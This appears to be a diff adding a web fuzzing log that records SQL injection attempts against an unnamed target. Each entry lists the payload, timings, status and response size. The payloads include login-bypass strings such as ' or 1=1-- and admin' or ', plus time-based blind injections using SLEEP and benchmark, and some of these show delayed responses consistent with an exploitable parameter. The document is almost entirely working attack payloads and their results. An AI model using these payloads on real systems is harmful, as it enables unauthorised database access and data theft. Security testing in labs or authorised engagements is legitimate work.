@@ -1,0 +1,234 @@
+Request: 28
+Payload: '%20--
+Req Time: 0.009966
+Resp Time: 0.078049
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 36
+Payload: ' or 0=0 --
+Req Time: 0.017418
+Resp Time: 0.00374
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 39
+Payload: ' or 0=0 #
+Req Time: 0.013146
+Resp Time: 0.003366
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 42
+Payload: ' or 1=1--
+Req Time: 0.009882
+Resp Time: 0.003093
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 45
+Payload: "' or 1 --'"
+Req Time: 0.010312
+Resp Time: 0.00313
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 49
+Payload: ' or 1=1 or ''='
+Req Time: 0.013568
+Resp Time: 0.003695
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 58
+Payload: hi' or 'a'='a
+Req Time: 0.024709
+Resp Time: 0.008292
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 128
+Payload: x' or 1=1 or 'x'='y
+Req Time: 0.008426
+Resp Time: 0.005968
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 130
+Payload: ' or ''='
+Req Time: 0.010733
+Resp Time: 0.007535
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 141
+Payload: 1'or'1'='1
+Req Time: 0.009873
+Resp Time: 0.002394
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 142
+Payload: 1' or '1'='1
+Req Time: 0.015643
+Resp Time: 0.004141
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 144
+Payload: fake@ema'or'il.nl'='il.nl
+Req Time: 0.018983
+Resp Time: 0.002992
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 153
+Payload: ' or '1'='1
+Req Time: 0.013786
+Resp Time: 0.002804
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 281
+Payload: 'OR 1=1--
+Req Time: 0.008847
+Resp Time: 0.004034
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 631
+Payload: or 1=1 or ''='
+Req Time: 0.009384
+Resp Time: 0.002241
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 635
+Payload: admin' or '
+Req Time: 0.013644
+Resp Time: 0.003451
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 667
+Payload: a' or 'a' = 'a
+Req Time: 0.016947
+Resp Time: 0.00251
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 673
+Payload: or 1 --'
+Req Time: 0.010975
+Resp Time: 0.007498
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 689
+Payload: or ''='
+Req Time: 0.011862
+Resp Time: 0.003184
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 704
+Payload: anything' OR 'x'='x
+Req Time: 0.016076
+Resp Time: 0.005132
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 730
+Payload: ' or 1 --'
+Req Time: 0.011402
+Resp Time: 0.005278
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 929
+Payload: +benchmark(3200,SHA1(1))+'
+Req Time: 0.006058
+Resp Time: 0.002744
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 930
+Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+Req Time: 5.015487
+Resp Time: 0.001976
+Status: 200
+Length: 487
+Words: 65
+Lines: 23
+
+Request: 937
+Payload: SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+Req Time: 6.011872
+Resp Time: 0.003705
+Status: 200
+Length: 487
+Words: 65
+Lines: 23
+
+Request: 1357
+Payload: or SLEEP(5)='
+Req Time: 15.011199
+Resp Time: 0.006122
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
+Request: 1358
+Payload: + SLEEP(10) + '
+Req Time: 30.011753
+Resp Time: 0.005734
+Status: 200
+Length: 1086
+Words: 240
+Lines: 70
+
